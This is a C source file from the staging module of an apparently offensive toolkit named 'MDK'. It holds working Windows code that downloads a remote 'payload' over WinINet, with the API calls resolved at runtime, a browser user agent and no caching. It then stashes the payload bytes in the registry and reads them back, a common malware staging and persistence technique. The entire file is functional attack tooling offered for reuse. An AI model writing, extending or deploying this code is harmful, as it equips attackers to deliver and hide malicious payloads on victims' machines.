// MDK
// docs    : https://sebafvs.com/mdk/staging
// author  : @sebafvs

#include <windows.h>
#include "mdk/staging.h"
#include "mdk/nt.h"
#include "mdk/utils.h"

// WinINet types, avoid wininet.h include order issues with nostdlib builds
typedef PVOID HINTERNET;

typedef HINTERNET(WINAPI* pfnInternetOpenW)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI* pfnInternetOpenUrlW)(HINTERNET, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* pfnInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* pfnInternetCloseHandle)(HINTERNET);
typedef BOOL(WINAPI* pfnInternetSetOptionW)(HINTERNET, DWORD, LPVOID, DWORD);

MDK_RESULT mdk_fetch_payload(IN LPCWSTR url, OUT PBYTE* payload, OUT SIZE_T* size) {
    HMODULE wininet_module = LoadLibraryA("WinINet.dll");
    if (!wininet_module) { return MDK_MAKE_FAIL("LoadLibraryA(WinINet)", MDK_STATUS_UNSUCCESSFUL); }

    pfnInternetOpenW      fn_open      = (pfnInternetOpenW)GetProcAddress(wininet_module, "InternetOpenW");
    pfnInternetOpenUrlW   fn_open_url  = (pfnInternetOpenUrlW)GetProcAddress(wininet_module, "InternetOpenUrlW");
    pfnInternetReadFile   fn_read      = (pfnInternetReadFile)GetProcAddress(wininet_module, "InternetReadFile");
    pfnInternetCloseHandle fn_close    = (pfnInternetCloseHandle)GetProcAddress(wininet_module, "InternetCloseHandle");
    pfnInternetSetOptionW fn_option    = (pfnInternetSetOptionW)GetProcAddress(wininet_module, "InternetSetOptionW");

    if (!fn_open || !fn_open_url || !fn_read || !fn_close || !fn_option) {
        FreeLibrary(wininet_module);
        return MDK_MAKE_FAIL("GetProcAddress(WinINet)", MDK_STATUS_ENTRYPOINT_NOT_FOUND);
    }

    // INTERNET_OPEN_TYPE_DIRECT = 1
    HINTERNET hInternet = fn_open(L"Mozilla/5.0", 1, NULL, NULL, 0);
    if (!hInternet) {
        FreeLibrary(wininet_module);
        return MDK_MAKE_FAIL("InternetOpenW", MDK_STATUS_UNSUCCESSFUL);
    }

    // INTERNET_FLAG_RELOAD = 0x80000000, bypass cache
    HINTERNET hConnect = fn_open_url(hInternet, url, NULL, 0, 0x80000000, 0);
    if (!hConnect) {
        fn_close(hInternet);
        FreeLibrary(wininet_module);
        return MDK_MAKE_FAIL("InternetOpenUrlW", MDK_STATUS_UNSUCCESSFUL);
    }

    BYTE*      buffer     = NULL;
    SIZE_T     total_size = 0;
    DWORD      bytes_read = 0;
    BYTE       chunk[1024] = { 0 };
    MDK_RESULT result     = MDK_MAKE_OK();

    while (1) {
        if (!fn_read(hConnect, chunk, sizeof(chunk), &bytes_read) || bytes_read == 0) {
            break;
        }

        BYTE* new_buffer;
        if (buffer == NULL) {
            new_buffer = (BYTE*)HeapAlloc(GetProcessHeap(), 0, bytes_read);
        } else {
            new_buffer = (BYTE*)HeapReAlloc(GetProcessHeap(), 0, buffer, total_size + bytes_read);
        }

        if (!new_buffer) {
            result = MDK_MAKE_FAIL("HeapAlloc/HeapReAlloc", MDK_STATUS_NO_MEMORY);
            goto _cleanup;
        }

        buffer = new_buffer;
        mdk_memcpy(buffer + total_size, chunk, bytes_read);
        total_size += bytes_read;
    }

    fn_option(NULL, 39, NULL, 0);

    *payload = buffer;
    *size    = total_size;
    buffer   = NULL;

_cleanup:
    if (buffer)   { HeapFree(GetProcessHeap(), 0, buffer); }
    fn_close(hConnect);
    fn_close(hInternet);
    FreeLibrary(wininet_module);
    return result;
}

MDK_RESULT mdk_reg_write_payload(IN HKEY root, IN LPCSTR key_path, IN LPCSTR value_name, IN const BYTE* payload, IN SIZE_T size) {

    HKEY hKey  = NULL;
    LONG status = RegCreateKeyExA(root, key_path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (status != ERROR_SUCCESS) {
        return MDK_MAKE_FAIL("RegCreateKeyExA", MDK_STATUS_UNSUCCESSFUL);
    }

    status = RegSetValueExA(hKey, value_name, 0, REG_BINARY, payload, (DWORD)size);
    RegCloseKey(hKey);

    if (status != ERROR_SUCCESS) {
        return MDK_MAKE_FAIL("RegSetValueExA", MDK_STATUS_UNSUCCESSFUL);
    }

    return MDK_MAKE_OK();
}

MDK_RESULT mdk_reg_read_payload(IN HKEY root, IN LPCSTR key_path, IN LPCSTR value_name, OUT PBYTE* payload, OUT SIZE_T* size) {
    // First call, get required buffer size
    DWORD required_size = 0;
    // RRF_RT_REG_BINARY = 0x00000008
    LONG  status = RegGetValueA(root, key_path, value_name, 0x00000008, NULL, NULL, &required_size);
    if (status != ERROR_SUCCESS) {
        return MDK_MAKE_FAIL("RegGetValueA(size)", MDK_STATUS_UNSUCCESSFUL);
    }

    BYTE* buffer = (BYTE*)HeapAlloc(GetProcessHeap(), 0, required_size);
    if (!buffer) {
        return MDK_MAKE_FAIL("HeapAlloc", MDK_STATUS_NO_MEMORY);
    }

    // Second call, read the data
    DWORD buffer_size = required_size;
    status = RegGetValueA(root, key_path, value_name, 0x00000008, NULL, buffer, &buffer_size);
    if (status != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, buffer);
        return MDK_MAKE_FAIL("RegGetValueA(data)", MDK_STATUS_UNSUCCESSFUL);
    }

    *payload = buffer;
    *size    = (SIZE_T)buffer_size;
    return MDK_MAKE_OK();
}
